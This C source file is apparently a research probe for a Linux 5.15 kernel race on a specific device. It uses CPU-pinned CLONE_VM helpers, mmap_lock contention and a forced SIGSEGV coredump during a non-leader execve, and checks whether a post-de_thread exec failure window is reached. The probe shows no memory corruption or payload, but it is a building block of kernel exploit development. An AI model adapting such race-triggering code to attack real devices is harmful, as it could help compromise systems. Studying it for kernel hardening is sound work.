/**
 * @file core_state_probe.c
 * @brief Non-UAF A301SO probe for a post-de_thread core_state exec failure.
 *
 * The probe creates no POSIX timer. A non-leader thread execs this binary
 * while CLONE_VM lockers contend old_mm->mmap_lock. After exchange_tids makes
 * the old exec TID disappear, a separate CLONE_VM process raises SIGSEGV.
 * A passing run observes CoreDumping=1, no successful exec re-entry, and a
 * signal-terminated target. This validates only the 5.15 failure window.
 */
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "a301so_515_params.h"
#include "core_state_probe_params.h"

struct probe_message
{
    uint32_t magic;
    uint32_t type;
    int32_t pid;
    int32_t tid;
    int32_t value;
};

struct probe_state
{
    _Atomic int go;
    _Atomic int locker_started;
    _Atomic int exec_tid;
    _Atomic int core_go;
    _Atomic int core_raise_issued;
    pid_t tgid;
    int report_fd;
    int start_fd;
    void *fragment_base;
    size_t fragment_length;
};

struct helper_argument
{
    struct probe_state *state;
    int cpu;
    int role;
};

struct attempt_result
{
    int ready;
    int exchange_seen;
    int core_raise_seen;
    int core_dumping_seen;
    int exec_committed;
    int exec_returned;
    int target_status;
    int target_reaped;
};

/**
 * @brief Return monotonic time in milliseconds.
 * @return Monotonic millisecond counter.
 * @note Failure is treated as zero because the probe timeout remains bounded.
 */
static long monotonic_ms(void)
{
    struct timespec ts;

    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0)
        return 0;
    return (long)ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
}

/**
 * @brief Pin the calling task to one online A301SO CPU.
 * @param cpu Logical CPU number.
 * @return Zero on success and -1 on sched_setaffinity failure.
 */
static int pin_cpu(int cpu)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

/**
 * @brief Emit one atomic fixed-size probe message.
 * @param fd Report pipe file descriptor.
 * @param type Message type from core_state_probe_params.h.
 * @param value Role, errno, or other type-specific integer.
 * @return Zero for a complete write and -1 otherwise.
 */
static int emit_message(int fd, uint32_t type, int value)
{
    struct probe_message message = {
        .magic = GLK98260_CORE_PROBE_MAGIC,
        .type = type,
        .pid = (int32_t)syscall(SYS_getpid),
        .tid = (int32_t)syscall(SYS_gettid),
        .value = (int32_t)value};

    return write(fd, &message, sizeof(message)) ==
                   (ssize_t)sizeof(message)
               ? 0
               : -1;
}

/**
 * @brief Create the fragmented mapping used by the mmap-lock contenders.
 * @param state Shared probe state receiving the mapping and length.
 * @return Zero on success or -1 on any memfd/mmap failure.
 * @note The mapping is private to the target mm and shared only by CLONE_VM.
 */
static int prepare_fragmented_range(struct probe_state *state)
{
    size_t length = (size_t)GLK98260_VMA_COUNT * GLK98260_PAGE_SIZE;
    int fd = (int)syscall(SYS_memfd_create, "gl98260-coreprobe", 1U);
    void *base;

    if (fd < 0 || ftruncate(fd, (off_t)GLK98260_PAGE_SIZE) != 0)
        return -1;
    base = mmap(NULL, length, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS,
                -1, 0);
    if (base == MAP_FAILED)
    {
        close(fd);
        return -1;
    }
    for (size_t index = 0; index < GLK98260_VMA_COUNT; index++)
    {
        void *address = (unsigned char *)base +
                        index * GLK98260_PAGE_SIZE;
        void *mapped = mmap(address, GLK98260_PAGE_SIZE, PROT_READ,
                            MAP_SHARED | MAP_FIXED, fd, 0);

        if (mapped != address)
        {
            close(fd);
            return -1;
        }
    }
    close(fd);
    state->fragment_base = base;
    state->fragment_length = length;
    return 0;
}

/**
 * @brief Repeatedly take old_mm->mmap_lock through mprotect.
 * @param opaque Pointer to helper_argument.
 * @return Never returns during a normal probe; returns 120 on setup failure.
 * @note Coredump teardown is the normal endpoint for this CLONE_VM process.
 */
static int locker_main(void *opaque)
{
    struct helper_argument *argument = opaque;
    struct probe_state *state = argument->state;
    int protection = PROT_NONE;

    if (pin_cpu(argument->cpu) != 0)
        return 120;
    (void)emit_message(state->report_fd, GLK98260_CORE_PROBE_MSG_HELPER,
                       argument->role);
    while (!atomic_load(&state->go))
        sched_yield();
    atomic_fetch_add(&state->locker_started, 1);
    for (;;)
    {
        (void)mprotect(state->fragment_base, state->fragment_length,
                       protection);
        protection = protection == PROT_NONE ? PROT_READ : PROT_NONE;
    }
}

/**
 * @brief Detect exchange_tids completion independently of coredump ordering.
 * @param opaque Pointer to helper_argument.
 * @return Never returns normally; returns 121 on affinity failure.
 */
static int coordinator_main(void *opaque)
{
    struct helper_argument *argument = opaque;
    struct probe_state *state = argument->state;
    int exec_tid;

    if (pin_cpu(argument->cpu) != 0)
        return 121;
    (void)emit_message(state->report_fd, GLK98260_CORE_PROBE_MSG_HELPER,
                       argument->role);
    while ((exec_tid = atomic_load(&state->exec_tid)) == 0)
        sched_yield();
    for (;;)
    {
        errno = 0;
        if (syscall(SYS_tgkill, state->tgid, exec_tid, 0) < 0 &&
            errno == ESRCH)
            break;
        sched_yield();
    }
    (void)emit_message(state->report_fd, GLK98260_CORE_PROBE_MSG_EXCHANGE,
                       exec_tid);
    for (;;)
        pause();
}

/**
 * @brief Start a real coredump from a separate process sharing old_mm.
 * @param opaque Pointer to helper_argument.
 * @return Never returns normally; returns 122 on affinity failure.
 * @note SIGSEGV remains at SIG_DFL and RLIMIT_CORE is configured by target.
 */
static int coredump_main(void *opaque)
{
    struct helper_argument *argument = opaque;
    struct probe_state *state = argument->state;

    if (pin_cpu(argument->cpu) != 0)
        return 122;
    (void)signal(SIGSEGV, SIG_DFL);
    (void)emit_message(state->report_fd, GLK98260_CORE_PROBE_MSG_HELPER,
                       argument->role);
    while (!atomic_load(&state->core_go))
        sched_yield();
    (void)emit_message(state->report_fd, GLK98260_CORE_PROBE_MSG_CORE_RAISE,
                       0);
    atomic_store(&state->core_raise_issued, 1);
    (void)syscall(SYS_tgkill, syscall(SYS_getpid), syscall(SYS_gettid),
                  SIGSEGV);
    for (;;)
        pause();
}

/**
 * @brief Allocate a stack and create one separate CLONE_VM process.
 * @param entry Helper entry point.
 * @param argument Stable helper argument stored in the shared old mm.
 * @return Helper PID on success or -1 on allocation/clone failure.
 */
static pid_t spawn_vm_helper(int (*entry)(void *),
                             struct helper_argument *argument)
{
    void *stack = mmap(NULL, GLK98260_HELPER_STACK_BYTES,
                       PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    int result;

    if (stack == MAP_FAILED)
        return -1;
    result = clone(entry,
                   (unsigned char *)stack + GLK98260_HELPER_STACK_BYTES,
                   CLONE_VM | SIGCHLD, argument);
    if (result < 0)
        (void)munmap(stack, GLK98260_HELPER_STACK_BYTES);
    return (pid_t)result;
}

/**
 * @brief Execute the same ELF from a non-leader thread.
 * @param opaque Pointer to shared probe_state.
 * @return Never returns to pthread_join; exits on exec failure.
 */
static void *exec_thread_main(void *opaque)
{
    struct probe_state *state = opaque;
    char start;
    char *const arguments[] = {(char *)"gl98260-coreprobe",
                               (char *)"reentry", NULL};
    char *const environment[] = {(char *)"PATH=/system/bin:/system/xbin",
                                 NULL};

    if (pin_cpu(GLK98260_TRIGGER_CPU) != 0)
        _exit(123);
    if (emit_message(state->report_fd, GLK98260_CORE_PROBE_MSG_READY, 0) != 0)
        _exit(124);
    if (read(state->start_fd, &start, 1) != 1)
        _exit(125);
    atomic_store(&state->exec_tid, (int)syscall(SYS_gettid));
    atomic_store(&state->go, 1);
    while (atomic_load(&state->locker_started) < GLK98260_LOCKER_COUNT)
        sched_yield();
    for (volatile unsigned long spin = 0;
         spin < GLK98260_CORE_PROBE_PRE_CORE_SPINS; spin++)
        __asm__ volatile("" ::: "memory");
    atomic_store(&state->core_go, 1);
    while (!atomic_load(&state->core_raise_issued))
        sched_yield();
    for (volatile unsigned long spin = 0;
         spin < GLK98260_CORE_PROBE_POST_CORE_SPINS; spin++)
        __asm__ volatile("" ::: "memory");
    execve("/proc/self/exe", arguments, environment);
    (void)emit_message(state->report_fd,
                       GLK98260_CORE_PROBE_MSG_EXEC_RETURNED, errno);
    _exit(126);
}

/**
 * @brief Run the target mm, helpers, and non-leader exec thread.
 * @return Only setup failures return; de_thread/coredump normally terminates it.
 */
static int target_main(void)
{
    struct probe_state *state;
    struct helper_argument *arguments;
    pthread_t exec_thread;
    struct rlimit core_limit = {
        .rlim_cur = (rlim_t)GLK98260_CORE_PROBE_CORE_LIMIT_BYTES,
        .rlim_max = (rlim_t)GLK98260_CORE_PROBE_CORE_LIMIT_BYTES};
    const int locker_cpus[GLK98260_LOCKER_COUNT] = {
        GLK98260_LOCKER_CPU_A,
        GLK98260_LOCKER_CPU_B,
        GLK98260_CORE_PROBE_LOCKER_CPU_C};

    if (setrlimit(RLIMIT_CORE, &core_limit) != 0 ||
        prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) != 0)
        return 127;
    state = mmap(NULL, sizeof(*state), PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    arguments = calloc(GLK98260_LOCKER_COUNT + 2U, sizeof(*arguments));
    if (state == MAP_FAILED || arguments == NULL)
        return 128;
    memset(state, 0, sizeof(*state));
    state->tgid = getpid();
    state->report_fd = GLK98260_CORE_PROBE_REPORT_FD;
    state->start_fd = GLK98260_CORE_PROBE_START_FD;
    if (prepare_fragmented_range(state) != 0)
        return 129;

    for (unsigned index = 0; index < GLK98260_LOCKER_COUNT; index++)
    {
        arguments[index].state = state;
        arguments[index].cpu = locker_cpus[index];
        arguments[index].role = GLK98260_CORE_PROBE_ROLE_LOCKER;
        if (spawn_vm_helper(locker_main, &arguments[index]) < 0)
            return 130;
    }
    arguments[GLK98260_LOCKER_COUNT].state = state;
    arguments[GLK98260_LOCKER_COUNT].cpu =
        GLK98260_CORE_PROBE_COORDINATOR_CPU;
    arguments[GLK98260_LOCKER_COUNT].role =
        GLK98260_CORE_PROBE_ROLE_COORDINATOR;
    if (spawn_vm_helper(coordinator_main,
                        &arguments[GLK98260_LOCKER_COUNT]) < 0)
        return 131;
    arguments[GLK98260_LOCKER_COUNT + 1U].state = state;
    arguments[GLK98260_LOCKER_COUNT + 1U].cpu =
        GLK98260_CORE_PROBE_COREDUMP_CPU;
    arguments[GLK98260_LOCKER_COUNT + 1U].role =
        GLK98260_CORE_PROBE_ROLE_COREDUMP;
    if (spawn_vm_helper(coredump_main,
                        &arguments[GLK98260_LOCKER_COUNT + 1U]) < 0)
        return 132;
    if (pthread_create(&exec_thread, NULL, exec_thread_main, state) != 0)
        return 133;
    for (;;)
        pause();
}

/**
 * @brief Read CoreDumping from one helper's proc status.
 * @param pid Coredump helper PID.
 * @return One if CoreDumping is 1, zero if absent/not yet set, and -1 on I/O.
 */
static int read_core_dumping(pid_t pid)
{
    char path[64];
    char line[256];
    FILE *file;

    (void)snprintf(path, sizeof(path), "/proc/%d/status", pid);
    file = fopen(path, "r");
    if (file == NULL)
        return -1;
    while (fgets(line, sizeof(line), file) != NULL)
    {
        int value;

        if (sscanf(line, "CoreDumping:%d", &value) == 1)
        {
            fclose(file);
            return value == 1 ? 1 : 0;
        }
    }
    fclose(file);
    return 0;
}

/**
 * @brief Kill every retained process that survived an inconclusive attempt.
 * @param target Target process PID.
 * @param helpers Helper PID array.
 * @param helper_count Number of valid entries.
 * @note No POSIX timer exists, so ordinary kill/reap is the intended endpoint.
 */
static void cleanup_attempt(pid_t target, const pid_t *helpers,
                            size_t helper_count)
{
    for (size_t index = 0; index < helper_count; index++)
        if (helpers[index] > 0)
            (void)kill(helpers[index], SIGKILL);
    if (target > 0)
        (void)kill(target, SIGKILL);
    if (target > 0)
        (void)waitpid(target, NULL, 0);
}

/**
 * @brief Run one isolated coredump/exec ordering attempt.
 * @param attempt One-based attempt number for logs.
 * @param result Output observation record.
 * @return Zero when the attempt executed, or -1 on parent-side setup failure.
 */
static int run_attempt(unsigned attempt, struct attempt_result *result)
{
    int start_pipe[2];
    int report_pipe[2];
    pid_t target;
    pid_t helpers[GLK98260_CORE_PROBE_HELPER_CAPACITY] = {0};
    size_t helper_count = 0;
    pid_t coredump_pid = -1;
    long deadline;
    long exit_seen_at = 0;

    memset(result, 0, sizeof(*result));
    if (pipe(start_pipe) != 0 || pipe(report_pipe) != 0)
        return -1;
    target = fork();
    if (target == 0)
    {
        int start_copy = fcntl(start_pipe[0], F_DUPFD, 20);
        int report_copy = fcntl(report_pipe[1], F_DUPFD, 20);

        close(start_pipe[0]);
        close(start_pipe[1]);
        close(report_pipe[0]);
        close(report_pipe[1]);
        if (start_copy < 0 || report_copy < 0 ||
            dup2(start_copy, GLK98260_CORE_PROBE_START_FD) < 0 ||
            dup2(report_copy, GLK98260_CORE_PROBE_REPORT_FD) < 0)
            _exit(134);
        close(start_copy);
        close(report_copy);
        _exit(target_main());
    }
    if (target < 0)
        return -1;
    close(start_pipe[0]);
    close(report_pipe[1]);
    (void)fcntl(report_pipe[0], F_SETFL,
                fcntl(report_pipe[0], F_GETFL, 0) | O_NONBLOCK);
    printf("[probe] attempt=%u target=%d\n", attempt, target);
    deadline = monotonic_ms() + GLK98260_CORE_PROBE_TIMEOUT_MS;
    while (monotonic_ms() < deadline)
    {
        struct probe_message message;
        ssize_t count;

        while ((count = read(report_pipe[0], &message, sizeof(message))) ==
               (ssize_t)sizeof(message))
        {
            if (message.magic != GLK98260_CORE_PROBE_MAGIC)
                continue;
            printf("[event] type=%u pid=%d tid=%d value=%d\n",
                   message.type, message.pid, message.tid, message.value);
            if (message.type == GLK98260_CORE_PROBE_MSG_HELPER &&
                helper_count < GLK98260_CORE_PROBE_HELPER_CAPACITY)
            {
                helpers[helper_count++] = (pid_t)message.pid;
                if (message.value == GLK98260_CORE_PROBE_ROLE_COREDUMP)
                    coredump_pid = (pid_t)message.pid;
            }
            else if (message.type == GLK98260_CORE_PROBE_MSG_READY)
            {
                char start = 'S';

                result->ready = 1;
                if (write(start_pipe[1], &start, 1) != 1)
                    printf("[probe] start write failed errno=%d\n", errno);
            }
            else if (message.type == GLK98260_CORE_PROBE_MSG_EXCHANGE)
                result->exchange_seen = 1;
            else if (message.type == GLK98260_CORE_PROBE_MSG_CORE_RAISE)
                result->core_raise_seen = 1;
            else if (message.type == GLK98260_CORE_PROBE_MSG_EXEC_COMMITTED)
                result->exec_committed = 1;
            else if (message.type == GLK98260_CORE_PROBE_MSG_EXEC_RETURNED)
                result->exec_returned = 1;
        }
        if (coredump_pid > 0 && read_core_dumping(coredump_pid) == 1)
            result->core_dumping_seen = 1;
        if (!result->target_reaped)
        {
            pid_t waited = waitpid(target, &result->target_status, WNOHANG);

            if (waited == target)
            {
                result->target_reaped = 1;
                exit_seen_at = monotonic_ms();
            }
        }
        if (result->target_reaped &&
            monotonic_ms() - exit_seen_at >= GLK98260_CORE_PROBE_POST_EXIT_MS)
            break;
        usleep(GLK98260_CORE_PROBE_POLL_US);
    }
    close(start_pipe[1]);
    close(report_pipe[0]);
    if (!result->target_reaped)
        cleanup_attempt(target, helpers, helper_count);
    else
        for (size_t index = 0; index < helper_count; index++)
            if (kill(helpers[index], 0) == 0)
                (void)kill(helpers[index], SIGKILL);
    return 0;
}

/**
 * @brief Entry point for re-entry detection and bounded probe attempts.
 * @param argc Argument count.
 * @param argv Argument vector; "reentry" indicates successful exec commit.
 * @return Zero on an observed core_state-compatible failure window, else 1.
 */
int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc > 1 && strcmp(argv[1], "reentry") == 0)
    {
        (void)emit_message(GLK98260_CORE_PROBE_REPORT_FD,
                           GLK98260_CORE_PROBE_MSG_EXEC_COMMITTED, 0);
        return 42;
    }
    printf("[target] id=%s params=%s probe=core_state-no-timers\n",
           GLK98260_TARGET_ID, GLK98260_PARAM_REVISION);
    for (unsigned attempt = 1; attempt <= GLK98260_CORE_PROBE_ATTEMPTS;
         attempt++)
    {
        struct attempt_result result;
        int signal_number = 0;
        int exit_code = -1;
        int passed;

        if (run_attempt(attempt, &result) != 0)
            return 1;
        if (result.target_reaped && WIFSIGNALED(result.target_status))
            signal_number = WTERMSIG(result.target_status);
        if (result.target_reaped && WIFEXITED(result.target_status))
            exit_code = WEXITSTATUS(result.target_status);
        passed = result.ready && result.exchange_seen &&
                 result.core_raise_seen && result.core_dumping_seen &&
                 !result.exec_committed && !result.exec_returned &&
                 result.target_reaped && signal_number != 0;
        printf("[result] attempt=%u ready=%d exchange=%d core_raise=%d "
               "core_dumping=%d exec_committed=%d exec_returned=%d "
               "signal=%d exit=%d verdict=%s\n",
               attempt, result.ready, result.exchange_seen,
               result.core_raise_seen, result.core_dumping_seen,
               result.exec_committed, result.exec_returned, signal_number,
               exit_code, passed ? "PASS" : "INCONCLUSIVE");
        if (passed)
        {
            printf("CORE_STATE_WINDOW_PASS\n");
            return 0;
        }
    }
    printf("CORE_STATE_WINDOW_UNVERIFIED\n");
    return 1;
}
